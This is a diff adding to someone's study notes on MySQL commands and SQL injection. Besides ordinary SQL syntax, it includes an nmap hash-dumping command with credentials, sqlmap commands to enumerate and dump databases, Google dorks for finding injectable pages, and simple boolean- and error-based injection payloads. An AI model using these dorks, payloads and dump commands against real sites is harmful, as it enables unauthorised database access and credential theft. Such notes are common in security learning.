@@ -62,13 +62,64 @@ TABLES
 ```
 mysql> show tables;
 mysql> create table coffee_table (
-- id int,
-- name varchar(255),
-- region varchar(255),
-- roast varchar(255)
-- );
+  id int,
+  name varchar(255),
+  region varchar(255),
+  roast varchar(255)
+  );
 mysql> describe coffee_table;
 mysql> show columns from coffee_table;
+```
+```
+mysql> show tables;
+mysql> show columns from <table_name>;
+mysql> create table <tablename>(
+     <column_name> <datatype> <parameter>,
+     <column_name> <datatype> <parameter>,
+     <column_name> <datatype> <parameter>
+);
+mysql> create table student(
+     student_id INT PRIMARY KEY,
+     name VARCHAR(20),
+     major VARCHAR(20)
+);
+mysql> insert into <table_name> (field1,field2,...,fieldN) values (value1, value2,...,valueN);
+mysql> delete from <table_name> where <condition>
+mysql> delete from result_tbl where result_id = 5;
+mysql> delete * from result_tbl;
+mysql> update <table_name> set <field1>=<new_value1>, <field2>=<new_value2> where <condition>
+mysql> update team_tbl set captain_name = "John" where team_name = "StarWar";
+mysql> select * from <table_name> order by <column_name> asc;
+mysql> select * from <table_name> order by <column_name> desc;
+mysql> select * from <table_name> order by <column_num> asc;
+mysql> select * from <table_name> order by <column_num>;
+mysql> select * from <table_name> limit <number of first rows>
+mysql> select * from <table_name> limit <index number of row>,<number of rows>
+
+mysql> select 1,2,3,4 from team_tbl;
+mysql> select 1,2,3,4;
+mysql> select 1 from team_tbl;
+mysql> select 1 as number;
+mysql> select group_concat(table_name) from information_schema.tables;
+```
+
+Managing Users In Mysql
+```
+mysql> insert into user
+     (host, user, password,
+      select_priv, insert_priv, update_priv, ssl_cipher, x509_issuer, x509_subject, authentication_string)
+      values ('localhost','chris',
+      password('chris2014'), 'Y', 'Y', 'Y', '', '', '', '');
+mysql> select host, user, password from user where user = 'chris';
+mysql> grant <permission_type> on <dbname>.<tablename> to '<username>'@'localhost';
+mysql> grant all privileges on *.* to 'chris'@'localhost';
+mysql> flush privileges;
+mysql> drop user '<username>'@'localhost';
+```
+
+`nmap` dump mysql hashes
+```
+nmap -p 3306 --script 10.0.2.23 mysql-dump-hashes --script-args="username=chris,password=chris2014"
 ```
 
 INSERT
@@ -120,3 +171,45 @@ Blind SQLi
 - Time-Based
 Out-Of-Bound SQLi
 ```
+
+
+Using `sqlmap`
+```
+sqlmap -u <link> --dbs
+sqlmap -u <link> -D <dbname> --tables
+sqlmap -u <link> -D <dbname> -T <table_name> --columns
+sqlmap -u <link> -D <dbname> -T <table_name> -C <column_name> --dump
+```
+```
+-r <requestfile> #request file from burp
+--dbms #specify the type of backend db
+```
+
+Search Vulnerable Sites(Google Dorks)
+```
+site:<host> php?id=
+site:http://testphp.vulnweb.com/ php?id=
+inurl:php id=site.in
+inurl:login.php?id=
+```
+
+Boolean Based
+```
+select * from team_tbl where captain='' or 1='1';
+```
+
+ErrorBased
+```
+select * from team_tbl where id = 1 order by 4;
+```
+
+
+
+
+
+
+
+
+
+
+
